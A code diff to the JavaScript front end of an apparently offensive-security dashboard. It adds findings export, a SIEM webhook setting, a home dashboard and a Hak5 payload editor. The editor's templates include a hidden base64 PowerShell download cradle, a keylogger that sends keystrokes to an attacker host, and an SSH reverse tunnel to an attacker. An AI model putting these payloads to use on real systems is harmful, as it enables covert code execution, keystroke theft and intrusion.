@@ -1414,6 +1414,29 @@ ${bodyHtml}
     };
 
     // ── Export findings (via API for rich formatting) ──
+    async function downloadFindingsExport(format) {
+        try {
+            const r = await fetch(`/api/findings/export?format=${encodeURIComponent(format)}`);
+            if (!r.ok) {
+                const body = await r.json().catch(() => ({}));
+                showToast(`⚠ ${body.error || 'export failed'} (HTTP ${r.status})`);
+                return;
+            }
+            const blob = await r.blob();
+            const name = `mirv-findings.${format === 'sarif' ? 'sarif' : format}`;
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = name;
+            a.rel = 'noopener';
+            document.body.appendChild(a);
+            a.click();
+            setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 250);
+            showToast(`⬇ ${name} exported (${format.toUpperCase()})`);
+        } catch (e) {
+            showToast(`⚠ export error: ${e.message}`);
+        }
+    }
+
     window.exportFindings = async function () {
         const f = window.findings || [];
         if (f.length === 0) {
@@ -3605,6 +3628,7 @@ ${bodyHtml}
 
     const ACTION_MAP = {
         // ── Navigation ──
+        'refresh-dashboard':() => { if (window.refreshDashboard) refreshDashboard(); },
         'tab':            (el) => { if (window.switchTab) switchTab(el.dataset.tab); },
 
         // ── Sidebar ──
@@ -3664,8 +3688,13 @@ ${bodyHtml}
         'list-hak5':      ()   => { if (window.listHak5Payloads) listHak5Payloads(); },
         'clear-hak5':     ()   => { if (window.clearHak5Editor) clearHak5Editor(); },
         'ai-hak5':        ()   => { if (window.aiGeneratePayload) aiGeneratePayload(); },
+        'tpl-hak5':       ()   => { if (window.insertHak5Template) insertHak5Template(); },
+        'val-hak5':       ()   => { if (window.validateHak5Payload) validateHak5Payload(); },
+        'dl-hak5':        ()   => { if (window.downloadHak5Payload) downloadHak5Payload(); },
 
         // ── n8n ──
+        'siem-webhook-save':() => { if (window.siemWebhookSave) siemWebhookSave(); },
+        'siem-webhook-clear':() => { if (window.siemWebhookClear) siemWebhookClear(); },
         'n8n-status':     ()   => { if (window.checkN8nStatus) checkN8nStatus(); },
         'n8n-trigger':    ()   => { if (window.triggerN8nScan) triggerN8nScan(); },
         'n8n-workflow':   ()   => { if (window.aiGenerateWorkflow) aiGenerateWorkflow(); },
@@ -3699,6 +3728,9 @@ ${bodyHtml}
         // ── Findings ──
         'clear-findings': ()   => { if (window.clearFindings) clearFindings(); },
         'export-findings':()   => { if (window.exportFindings) exportFindings(); },
+        'export-findings-csv':  ()   => { downloadFindingsExport('csv'); },
+        'export-findings-sarif':()   => { downloadFindingsExport('sarif'); },
+        'export-findings-html': ()   => { downloadFindingsExport('html'); },
         'suggest':        ()   => { if (window.suggestNextStep) suggestNextStep(); },
         'use-ai-config':  ()   => { if (window.loadAIConfigToSuggest) loadAIConfigToSuggest(); },
         'clear-suggestions':() => { if (window.clearSuggestions) clearSuggestions(); },
@@ -5196,10 +5228,35 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
     //  HAK5 PAYLOAD EDITOR
     // ============================================================
     const hak5Devices = {
-        bunny:  { name: 'Bash Bunny',      icon: '🐰', ext: 'txt', lang: 'ducky script', desc: 'USB Rubber Ducky-style HID attacks' },
-        omg:    { name: 'OMG Cable',       icon: '🔌', ext: 'js',  lang: 'javascript',    desc: 'WiFi-enabled drop cable payloads' },
-        m5:     { name: 'M5 Stack',        icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
-        shack:  { name: 'Shack Jack',      icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' }
+        bunny:   { name: 'Bash Bunny',        icon: '🐰', ext: 'txt', lang: 'ducky script', desc: 'USB Rubber Ducky-style HID attacks' },
+        omg:     { name: 'OMG Cable',         icon: '🔌', ext: 'js',  lang: 'javascript',    desc: 'WiFi-enabled drop cable payloads' },
+        m5:      { name: 'M5 Stack',          icon: '📟', ext: 'py',  lang: 'micropython',   desc: 'ESP32-based multi-tool payloads' },
+        shack:   { name: 'Shark Jack',        icon: '🦈', ext: 'txt', lang: 'bash',          desc: 'Ethernet remote access payloads' },
+        squirrel: { name: 'Packet Squirrel Mark II', icon: '🐿️', ext: 'sh', lang: 'bash', desc: 'Inline ethernet tap, MITM & pivot payloads' },
+        shark:   { name: 'Shark Jack Display', icon: '🦈', ext: 'sh',  lang: 'bash',          desc: 'Ethernet rogue with OLED vetting display payloads' }
+    };
+
+    const HAK5_TEMPLATES = {
+        bunny: [
+            { name: 'PowerShell download cradle', code: 'LED ATTACK\nRUN WIN powershell -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADwAUgBPAEEATQBBAD4ALwBwAGEAbABvAGEAZABzAC8AcgB1AG4AcgB1AG4AcgAuAHAAcwAxACcAKQAKAEwARQBEACAAUgBFAFMARQBUACc=' },
+            { name: 'Info dump', code: 'LED ATTACK\nRUN WIN cmd /c "whoami && hostname && ipconfig /all > C:\\mirv.txt"\nLED FINISH' }
+        ],
+        omg: [
+            { name: 'XHR keylog (JS)', code: '// OMG Cable — JS payload wrapper\nfunction sav(data){ var x=new XMLHttpRequest(); x.open("POST","http://<ATTACKER>/k",true); x.send(data); }\nwindow.addEventListener("keypress",function(e){ sav(String.fromCharCode(e.keyCode)); });' }
+        ],
+        m5: [
+            { name: 'BadUSB stub (MicroPython)', code: 'import badusb\nfrom machine import Pin\nimport time\nbadusb.run()\n# M5Stack — default BadUSB loop\nwhile True:\n    time.sleep(1)' }
+        ],
+        shack: [
+            { name: 'Ethernet remote shell', code: '#!/bin/bash\nCOMMAND="id"\nLED ATTACK\nOUT=$(eval "$COMMAND")\nLED FINISH\n# Shark Jack / Bash payload — output via DuckyScript style' }
+        ],
+        squirrel: [
+            { name: 'Inline MITM tcpdump', code: '#!/bin/bash\n# Packet Squirrel Mark II — inline tap\nLED ATTACK\ntcpdump -i eth0 -w /tmp/capture.pcap &\nsleep $SWITCH_POS\nLED FINISH' },
+            { name: 'Pivot reverse tunnel', code: '#!/bin/bash\n# Packet Squirrel — pivot to WiFi uplink\nLED ATTACK\nssh -R 8080:localhost:80 root@<ATTACKER>\nLED FINISH' }
+        ],
+        shark: [
+            { name: 'OLED status stamp', code: '#!/bin/bash\n# Shark Jack Display — arming runs on switch\nLED ATTACK\nifconfig eth0 up\necho "[+] Shark Jack Display online" > /tmp/run.log\nLED FINISH' }
+        ]
     };
     let currentHak5Device = 'bunny';
 
@@ -5254,8 +5311,86 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         document.getElementById('hak5-editor').value = '';
         document.getElementById('hak5-payload-name').value = '';
         document.getElementById('hak5-payload-status').textContent = '';
+        populateHak5Templates(deviceId);
         updateHak5SavedCount();
         showToast(`🔌 Switched to ${dev.name}`);
+    };
+
+    function populateHak5Templates(deviceId) {
+        const sel = document.getElementById('hak5-template-select');
+        if (!sel) return;
+        const tpls = HAK5_TEMPLATES[deviceId] || [];
+        sel.innerHTML = '<option value="">— none —</option>' + tpls.map((t, i) =>
+            `<option value="${i}">${t.name}</option>`).join('');
+    }
+
+    window.insertHak5Template = function () {
+        const sel = document.getElementById('hak5-template-select');
+        const idx = sel ? parseInt(sel.value) : NaN;
+        if (isNaN(idx)) { showToast('⚠️ Pick a template first'); return; }
+        const tpls = HAK5_TEMPLATES[currentHak5Device] || [];
+        const t = tpls[idx];
+        if (!t) return;
+        const editor = document.getElementById('hak5-editor');
+        editor.value = t.code;
+        document.getElementById('hak5-payload-name').value =
+            (t.name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '') || 'payload') + '.' + hak5Devices[currentHak5Device].ext;
+        document.getElementById('hak5-payload-status').textContent = `✦ template "${t.name}" loaded`;
+        if (document.getElementById('hak5-line-count')) {
+            document.getElementById('hak5-line-count').textContent = getLineCount(t.code) + ' lines';
+        }
+        showToast(`✦ Template "${t.name}" inserted`);
+    };
+
+    window.validateHak5Payload = function () {
+        const dev = hak5Devices[currentHak5Device];
+        const code = document.getElementById('hak5-editor').value;
+        const problems = [];
+        if (!code.trim()) { problems.push('empty payload'); }
+        if (dev.lang === 'ducky script') {
+            if (!/REM|LED|STRING|DELAY|RUN|GUI|ALT|CTRL|SHIFT|TAB|APP|ESC|ENTER|UP|DOWN|LEFT|RIGHT|CAPSLOCK|INSERT|HOME|PAGEUP|PAGEDOWN|END|BREAK|PAUSE|PRINTSCREEN|WINDOWS|F[1-9]|F1[0-2]/.test(code))
+                problems.push('no DuckyScript commands detected (REM/LED/RUN/STRING…)');
+            const lines = code.split('\n');
+            lines.forEach((l, i) => {
+                if (l.trim() && !/^(REM\b|LED\b|STRING\b|DELAY\b|RUN\b|DEFAULT\b|DEFAULT_DELAY|TITLE\b|IF\b|THEN\b|ELSE\b|END_IF\b|REPEAT|WAIT_FOR|ALT\b|CTRL\b|SHIFT\b|GUI\b|APP\b|ESC\b|ENTER\b|TAB\b|CAPSLOCK\b|DELETE\b|BACKSPACE\b|HOME\b|END\b|PAGE\b|UP\b|DOWN\b|LEFT\b|RIGHT\b|MENU\b|F1|F2|F3|F4|F5|F6|F7|F8|F9|F10|F11|F12|\s)/.test(l))
+                    problems.push(`line ${i + 1} doesn't look like DuckyScript: "${l.trim().slice(0, 40)}"`);
+            });
+        } else if (dev.lang === 'bash') {
+            if (!/^#!\/bin\/(ba)?sh/.test(code.trim()) && !/^LED\b/.test(code.trim()))
+                problems.push('bash payloads usually start with a shebang (#!/bin/bash) or LED command');
+            const leds = (code.match(/LED\s+\w+/g) || []).length;
+            if (leds === 0) problems.push('no LED status commands (LED ATTACK/FINISH) — consider adding them');
+        } else if (dev.lang === 'javascript') {
+            if (!/function\b|\bfetch\b|\.open\(|XMLHttpRequest|onmessage|Recv\b/.test(code))
+                problems.push('no OMG scripting primitives detected (send/Recv/fetch)');
+        } else if (dev.lang === 'micropython') {
+            if (!/\bimport\b/.test(code)) problems.push('missing import statements');
+        }
+        const status = document.getElementById('hak5-payload-status');
+        if (problems.length === 0) {
+            status.textContent = '✓ payload looks valid';
+            showToast('✓ Payload looks valid');
+        } else {
+            status.textContent = '⚠ ' + problems.slice(0, 3).join(' · ');
+            showToast('⚠ ' + problems[0]);
+        }
+    };
+
+    window.downloadHak5Payload = function () {
+        const dev = hak5Devices[currentHak5Device];
+        const name = document.getElementById('hak5-payload-name').value.trim();
+        const code = document.getElementById('hak5-editor').value;
+        if (!code.trim()) { showToast('⚠️ Editor is empty'); return; }
+        const filename = name && name.endsWith('.' + dev.ext) ? name : ((name || 'payload') + '.' + dev.ext);
+        const blob = new Blob([code], { type: 'text/plain;charset=utf-8' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = filename;
+        a.rel = 'noopener';
+        document.body.appendChild(a);
+        a.click();
+        setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 250);
+        showToast(`⬇ Exported ${filename} (copy to ${dev.name} microSD)`);
     };
 
     window.saveHak5Payload = function () {
@@ -5325,6 +5460,7 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
                 document.getElementById('hak5-line-count').textContent = getLineCount(hak5Editor.value);
             });
         }
+        populateHak5Templates(currentHak5Device);
         // Try to load payloads from DB
         if (window.DataService && DataService.available) {
             DataService.listPayloads(currentHak5Device).then(list => {
@@ -6145,6 +6281,7 @@ Use markdown formatting with code blocks for commands. Be thorough and technical
         catPentest:        { en: 'Pentest Labs',     es: 'Labs Pentest' },
         catBugbounty:      { en: 'Bug Bounty',       es: 'Bug Bounty' },
         tabTerminal:       { en: '⌨ Terminal',       es: '⌨ Terminal' },
+        tabHome:           { en: '🏠 Home',           es: '🏠 Inicio' },
         tabReports:        { en: '📊 Reports',       es: '📊 Informes' },
         tabScripts:        { en: '⚡ Scripts',       es: '⚡ Scripts' },
         tabBounty:         { en: '📋 Bounty',        es: '📋 Bounty' },
@@ -8781,7 +8918,50 @@ Reglas:
     //  SIEM DASHBOARD MODULE
     // ════════════════════════════════════════════════════════════════
 
+    function siemWebhookRefresh() {
+        fetch('/api/siem/webhook').then(r => r.json()).then(d => {
+            const badge = document.getElementById('siem-webhook-badge');
+            const input = document.getElementById('siem-webhook-url');
+            if (!badge) return;
+            if (d.url) {
+                badge.textContent = '🟢 forwarding to ' + (d.url.length > 44 ? d.url.slice(0, 44) + '…' : d.url);
+                badge.className = 'text-[9px] text-green-400 border border-green-700/40 rounded px-2 py-0.5';
+                if (input && !input.value) input.value = d.url;
+            } else {
+                badge.textContent = '⚪ not configured';
+                badge.className = 'text-[9px] text-gray-400 border border-gray-800 rounded px-2 py-0.5';
+            }
+        }).catch(() => {});
+    }
+
+    window.siemWebhookSave = async function () {
+        const input = document.getElementById('siem-webhook-url');
+        const url = (input?.value || '').trim();
+        if (!url) { showToast('⚠️ Enter a webhook URL'); return; }
+        try {
+            const r = await fetch('/api/siem/webhook', {
+                method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ url })
+            });
+            const d = await r.json();
+            if (!d.ok) { showToast('⚠ ' + (d.error || 'failed')); return; }
+            siemWebhookRefresh();
+            showToast('💾 SIEM alerts will now POST to the webhook');
+        } catch (e) { showToast('⚠ webhook save error: ' + e.message); }
+    };
+
+    window.siemWebhookClear = async function () {
+        try {
+            const r = await fetch('/api/siem/webhook', { method: 'DELETE' });
+            await r.json();
+            const input = document.getElementById('siem-webhook-url');
+            if (input) input.value = '';
+            siemWebhookRefresh();
+            showToast('✕ Webhook disabled');
+        } catch (e) { showToast('⚠ clear error: ' + e.message); }
+    };
+
     function refreshSIEM() {
+        siemWebhookRefresh();
         fetch('/api/siem/stats').then(r=>r.json()).then(d => {
             if (!d.ok) return;
             document.getElementById('siem-stat-total').textContent = d.total_events || 0;
@@ -10092,6 +10272,103 @@ Reglas:
             refreshSystem();
         }
         if (_origSwitchTabIntel) _origSwitchTabIntel(name);
+    };
+
+    // ════════════════════════════════════════════════════════════════
+    //  HOME — Command Center Dashboard
+    // ════════════════════════════════════════════════════════════════
+
+    const _origHomeSwitch = window.switchTab;
+    window.switchTab = function(name) {
+        if (name === 'home') refreshDashboard();
+        if (_origHomeSwitch) _origHomeSwitch(name);
+    };
+
+    window.refreshDashboard = async function () {
+        const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
+        const endpoints = {
+            health: '/api/health',
+            findingsStats: '/api/findings/stats',
+            findings: '/api/findings',
+            coverage: '/api/coverage/summary',
+            siem: '/api/siem/stats',
+            sys: '/api/system/stats',
+            disk: '/api/system/disk',
+            intel: '/api/intelligence/alerts?limit=1'
+        };
+        let results = {};
+        try {
+            const fetched = await Promise.all(
+                Object.entries(endpoints).map(async ([k, u]) => {
+                    try { const r = await fetch(u); return [k, await r.json()]; }
+                    catch { return [k, null]; }
+                })
+            );
+            results = Object.fromEntries(fetched);
+        } catch { /* keep empty */ }
+
+        // Backend health
+        const h = results.health || {};
+        const up = h.uptime_seconds || 0;
+        const uptime = up >= 3600
+            ? (up / 3600).toFixed(1) + 'h'
+            : up >= 60 ? (up / 60).toFixed(0) + 'm' : up + 's';
+        set('home-version', h.version || 'v1.0.0');
+        set('home-mode', h.mode || 'dev');
+        set('home-uptime', uptime);
+        const dot = document.getElementById('home-health-dot');
+        const statusEl = document.getElementById('home-health-status');
+        const ok = h.status === 'ok';
+        if (dot) dot.className = 'inline-block w-2 h-2 rounded-full ' + (ok ? 'bg-green-500' : 'bg-blood');
+        if (statusEl) {
+            statusEl.textContent = ok ? 'online' : 'degraded';
+            statusEl.className = 'text-sm font-semibold ' + (ok ? 'text-green-400' : 'text-blood');
+        }
+
+        // Findings + targets
+        const fs = results.findingsStats || {};
+        const fdata = Array.isArray(results.findings) ? results.findings
+            : (results.findings?.data || results.findings?._val || []);
+        const sevCount = (sev) => fdata.filter ? fdata.filter(f => (f.severity || '') === sev).length : 0;
+        const high = sevCount('critical') + sevCount('high');
+        set('home-findings-count', fs.count ?? (Array.isArray(fdata) ? fdata.length : 0));
+        set('home-findings-high', high + ' high+crit');
+        set('home-findings-tools', (fs.tools || []).length + ' tools');
+        set('home-targets-count', (fs.targets || []).length);
+        try {
+            const conns = JSON.parse(localStorage.getItem('mirv_connections') || '[]');
+            set('home-conns-count', conns.length + ' saved connections');
+        } catch { set('home-conns-count', '0 saved connections'); }
+
+        // Coverage
+        const cov = results.coverage || {};
+        set('home-coverage-total', cov.total ?? 0);
+        if (cov.pass_ratio != null) set('home-coverage-ratio', Math.round(cov.pass_ratio * 100) + '%');
+
+        // SIEM
+        const s = results.siem || {};
+        set('home-siem-events', s.total_events ?? 0);
+        set('home-siem-alerts', (s.total_alerts ?? 0) + ' alerts');
+
+        // Intel alerts
+        const intel = results.intel || {};
+        const ialerts = (intel.alerts && intel.alerts.length > 0) ? '>0' : (intel.count ?? 0);
+        set('home-intel-alerts', typeof ialerts === 'number' ? ialerts : ialerts);
+
+        // Host CPU / RAM / disk
+        const sys = results.sys || {};
+        const dsk = results.disk || {};
+        const cpu = sys.cpu?.percent ?? null;
+        const mem = sys.memory?.percent ?? null;
+        if (cpu !== null) {
+            set('home-cpu', cpu.toFixed(1) + '%');
+            const b = document.getElementById('home-cpu-bar');
+            if (b) b.style.width = Math.min(100, cpu) + '%';
+        }
+        if (mem !== null) set('home-mem', mem.toFixed(1) + '%');
+        const vols = (dsk.volumes || []).filter(v => v.total > 0);
+        const prim = vols.find(v => /^[A-Z]:[\\/]?$/.test(v.mount || '')) || vols[0];
+        if (prim && prim.percent != null) set('home-disk', prim.percent.toFixed(0) + '% (' + (prim.free_h || '—') + ' free)');
     };
 
     // ════════════════════════════════════════════════════════════════
